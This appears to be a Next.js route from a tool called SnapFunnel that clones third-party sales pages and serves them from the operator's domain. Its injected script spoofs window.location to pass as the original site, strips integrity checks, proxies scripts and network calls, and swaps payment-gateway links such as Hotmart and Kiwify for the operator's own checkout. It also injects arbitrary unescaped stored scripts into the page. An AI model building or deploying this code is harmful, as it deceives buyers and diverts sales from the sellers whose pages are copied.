import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import * as cheerio from 'cheerio';

/**
 * Page Proxy God Mode v7.0 — Pure Stable
 */

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;

    // 1. Buscar página
    const { data: page, error } = await supabaseAdmin
      .from('cloned_pages')
      .select('*')
      .eq('id', id)
      .single();

    if (error || !page || !page.original_url) {
      return new NextResponse('<h1>Página não encontrada</h1>', { status: 404 });
    }

    const config = page.config || {};
    const originalUrl = page.original_url;
    const checkoutUrl = config.checkout_url || '';

    // 2. Fetch do HTML Original
    const response = await fetch(originalUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      },
      next: { revalidate: 0 },
    });

    if (!response.ok) {
      return new NextResponse(`<h1>Erro ao acessar site original (${response.status})</h1>`, { status: 502 });
    }

    const rawHtml = new TextDecoder('utf-8').decode(await response.arrayBuffer());
    const $ = cheerio.load(rawHtml);
    const baseUrlObj = new URL(originalUrl);
    const baseUrl = baseUrlObj.origin;
    const targetHost = baseUrlObj.host;
    const targetPath = baseUrlObj.pathname;
    const currentOrigin = req.nextUrl.origin;

    // ═══════════════════════════════════════════════
    // 1. BASE TAG (Estabilidade Visual)
    // ═══════════════════════════════════════════════
    $('base').remove();
    $('head').prepend(`<base href="${originalUrl}">`);

    // ═══════════════════════════════════════════════
    // 2. ENGINE SNAPFUNNEL v7.0 (Pure Stable)
    // ═══════════════════════════════════════════════
    const engineScript = `
      <script id="snapfunnel-engine-v7">
        (function() {
          console.log("SnapFunnel Engine v7.0 - Pure Stable");
          const CHECKOUT_URL = '${checkoutUrl}';
          const TARGET_HOST = '${targetHost}';
          const TARGET_ORIGIN = '${baseUrl}';
          const TARGET_PATH = '${targetPath}';
          const PROXY_URL = '${currentOrigin}/api/proxy?url=';

          // 1. SPOOFING ESTÁVEL
          try {
            const spoof = (obj, prop, value) => {
              try { 
                const desc = Object.getOwnPropertyDescriptor(obj, prop);
                Object.defineProperty(obj, prop, { 
                  get: () => value,
                  set: (v) => { if (desc && desc.set) desc.set.call(obj, v); else obj[prop] = v; },
                  configurable: true 
                }); 
              } catch(e) {}
            };
            window.__PROXY_HOST__ = TARGET_HOST;
            window.__PROXY_ORIGIN__ = TARGET_ORIGIN;
            spoof(window.location, 'hostname', TARGET_HOST);
            spoof(window.location, 'host', TARGET_HOST);
            spoof(window.location, 'origin', TARGET_ORIGIN);
            spoof(window.location, 'pathname', TARGET_PATH);
          } catch(e) {}

          // 2. INTERCEPTOR DE CHECKOUT
          const gateways = ['checkout', 'pay', 'comprar', 'hotmart', 'eduzz', 'monetizze', 'kiwify', 'braip', 'cakto', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper', 'lowify', 'ironpay'];
          
          function patch(el) {
            if (el.tagName === 'A') {
              const href = (el.getAttribute('href') || '').toLowerCase();
              if (CHECKOUT_URL && (gateways.some(g => href.includes(g)) || el.dataset.checkout)) {
                el.href = CHECKOUT_URL;
                el.addEventListener('click', (e) => {
                  e.preventDefault(); e.stopPropagation();
                  const u = new URL(CHECKOUT_URL);
                  const p = new URLSearchParams(window.location.search);
                  ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'].forEach(k => { if (p.get(k)) u.searchParams.set(k, p.get(k)); });
                  window.location.href = u.toString();
                }, true);
              }
            }
          }

          const obs = new MutationObserver(m => m.forEach(r => r.addedNodes.forEach(n => {
            if (n.nodeType === 1) { 
              patch(n); 
              n.querySelectorAll('a, button').forEach(patch);
              if (n.tagName === 'SCRIPT' && n.src && !n.src.includes('/api/proxy')) {
                const src = n.src;
                n.src = PROXY_URL + encodeURIComponent(src) + '&overrideHost=' + TARGET_HOST;
              }
            }
          })));
          obs.observe(document.documentElement, { childList: true, subtree: true });
          
          window.addEventListener('load', () => {
             document.querySelectorAll('a, button').forEach(patch);
          });

          // 3. PROXY DE NETWORK (Fetch)
          const _fetch = window.fetch;
          window.fetch = async function(res, cfg) {
            let url = typeof res === 'string' ? res : (res instanceof Request ? res.url : res);
            if (url && (url.startsWith('/') || url.includes(TARGET_HOST)) && !url.includes('/api/proxy')) {
               const fullUrl = url.startsWith('/') ? TARGET_ORIGIN + url : url;
               url = PROXY_URL + encodeURIComponent(fullUrl) + '&overrideHost=' + TARGET_HOST;
               if (res instanceof Request) res = new Request(url, res);
               else res = url;
            }
            return _fetch.call(this, res, cfg);
          };
        })();
      </script>
    `;
    $('head').prepend(engineScript);

    // 3. REESCRITA DE ASSETS
    const gateways = ['checkout', 'pay', 'comprar', 'hotmart', 'eduzz', 'monetizze', 'kiwify', 'braip', 'cakto', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper'];
    
    $('[src], [href]').each((_, el) => {
      const tag = $(el).prop('tagName');
      const attr = $(el).attr('src') ? 'src' : 'href';
      let val = $(el).attr(attr) || '';
      
      if (!val || val.startsWith('data:') || val.startsWith('javascript:')) return;

      if (tag === 'A' && checkoutUrl && gateways.some(g => val.toLowerCase().includes(g))) {
        $(el).attr(attr, checkoutUrl);
        return;
      }

      const isScriptOrStyle = tag === 'SCRIPT' || (tag === 'LINK' && $(el).attr('rel') === 'stylesheet');

      if (isScriptOrStyle) {
        const absoluteVal = val.startsWith('/') ? baseUrl + val : (val.startsWith('http') ? val : baseUrl + '/' + val);
        const proxied = `${currentOrigin}/api/proxy?url=${encodeURIComponent(absoluteVal)}&overrideHost=${targetHost}`;
        $(el).attr(attr, proxied);
        $(el).removeAttr('integrity');
        $(el).removeAttr('crossorigin');
      }
    });

    if (config.pixel_script) $('body').append(`<div id="sf-pixel" style="display:none !important">${config.pixel_script}</div>`);
    if (config.head_scripts) $('head').append(config.head_scripts);
    if (config.body_scripts) $('body').append(config.body_scripts);

    return new NextResponse($.html(), {
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });

  } catch (error: any) {
    return new NextResponse(`Erro: ${error.message}`, { status: 500 });
  }
}
